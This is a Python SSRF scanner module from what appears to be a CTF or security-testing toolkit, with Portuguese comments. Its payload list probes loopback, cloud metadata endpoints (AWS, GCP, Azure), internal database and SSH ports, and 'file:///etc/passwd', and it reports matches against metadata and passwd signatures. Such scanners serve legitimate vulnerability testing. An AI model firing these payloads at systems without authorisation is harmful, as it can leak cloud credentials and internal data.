"""
domains/detection/ssrf_scanner.py — Scanner de SSRF (v7).

Testa parâmetros que aceitam URLs para detectar Server-Side Request Forgery.
Usa comparação baseline para eliminar falsos positivos.
"""

from typing import Iterable, Any
from ctflab.core.scanner import BaseScanner
from ctflab.core.models import ScanResult
from ctflab.core import http as H

class SSRFScanner(BaseScanner):
    name = "ssrf_detection"
    capabilities = ["http", "ssrf", "detection"]
    
    # Payloads expandidos para detectar SSRF (v7)
    PAYLOADS = [
        "http://127.0.0.1:80",
        "http://localhost",
        "http://[::1]",
        "http://0.0.0.0",
        "http://169.254.169.254/latest/meta-data/",       # AWS IMDSv1
        "http://169.254.169.254/latest/api/token",        # AWS IMDSv2
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
        "http://169.254.169.254/metadata/instance",       # Azure
        "file:///etc/passwd",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:6379",
        "http://127.0.0.1:27017",
    ]

    def __init__(self, ctx, path: str = "/", param: str = "url"):
        super().__init__(ctx)
        self.path = path
        self.param = param
        self._baseline_text = ""
        self._baseline_len = 0
        
        # Captura baseline com valor benigno para comparação diferencial
        try:
            resp = H.get(ctx.session, self.path, params={self.param: "http://example.com"})
            if resp:
                self._baseline_text = resp.text
                self._baseline_len = len(resp.text)
        except Exception:
            pass

    def get_payloads(self) -> Iterable[str]:
        return self.PAYLOADS

    def execute(self, payload: str) -> Any:
        return H.get(self.ctx.session, self.path, params={self.param: payload})

    def analyze(self, payload: str, response: Any) -> ScanResult:
        if not response or response.status_code >= 500:
            return ScanResult(success=False, confidence=0.0, details="-")

        text = response.text
        
        # Sinais fortes de SSRF confirmado (metadados de cloud)
        cloud_sigs = ["instance-id", "ami-id", "availabilityZone", "computeMetadata",
                      "microsoft.com", "network/interfaces"]
        if any(sig in text for sig in cloud_sigs):
            return ScanResult(
                success=True, confidence=1.0,
                details=f"SSRF CONFIRMADO (Cloud Metadata) via {self.param}",
                severity="Critical"
            )
        
        # Sinais fortes de leitura de arquivo local
        file_sigs = ["root:x:0:0", "daemon:x:1:1", "bin:x:2:2", "[boot loader]"]
        if any(sig in text for sig in file_sigs):
            return ScanResult(
                success=True, confidence=1.0,
                details=f"SSRF + LFI CONFIRMADO via {self.param}",
                severity="Critical"
            )
        
        # Sinais de serviços internos (banners de porta)
        service_sigs = ["SSH-2.0", "OpenSSH", "MySQL", "MariaDB", "Redis", "MongoDB"]
        if any(sig in text for sig in service_sigs):
            return ScanResult(
                success=True, confidence=0.95,
                details=f"SSRF detectado — Banner de serviço interno via {self.param}",
                severity="High"
            )

        # Comparação diferencial com baseline (evita FPs)
        if response.status_code == 200 and self._baseline_len > 0:
            diff_ratio = abs(len(text) - self._baseline_len) / self._baseline_len
            # Só reporta se a resposta for significativamente diferente do baseline
            if diff_ratio > 0.3 and text.strip() != self._baseline_text.strip():
                return ScanResult(
                    success=True, confidence=0.6,
                    details=f"Possível SSRF via {self.param} (resposta {diff_ratio:.0%} diferente do baseline)",
                    severity="Medium"
                )

        return ScanResult(success=False, confidence=0.0, details="-")
